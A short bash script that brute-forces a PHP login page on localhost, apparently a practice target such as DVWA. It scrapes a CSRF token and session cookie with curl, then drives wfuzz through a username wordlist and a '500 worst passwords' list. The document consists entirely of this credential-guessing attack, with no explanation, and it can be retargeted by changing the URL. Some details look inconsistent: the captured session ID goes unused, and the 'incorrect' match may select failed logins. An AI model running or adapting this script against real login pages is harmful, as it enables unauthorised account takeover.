#!/usr/bin/env bash
#

URL=http://localhost/login.php
COOKIE_FILE=cookie.txt
PATTERN=incorrect

# Get CSRF token
CSRF=$(curl -k -s -c $COOKIE_FILE "$URL" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)

# Get SESSIONID
SESSIONID=$(grep PHPSESSID $COOKIE_FILE | cut -d $'\t' -f7)

# Login form
curl -s -b $COOKIE_FILE -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "$URL"

# Bruteforce using wfuzz
wfuzz $(awk '/^[^#$]/ {print "-b " $6"="$7}' $COOKIE_FILE) -H "user_token:$CSRF"  -w ../wordlists/username.txt -w ../wordlists/500-worst-passwords.txt --ss $PATTERN "$URL/?Login=Login&username=FUZZ&password=FUZ2Z"
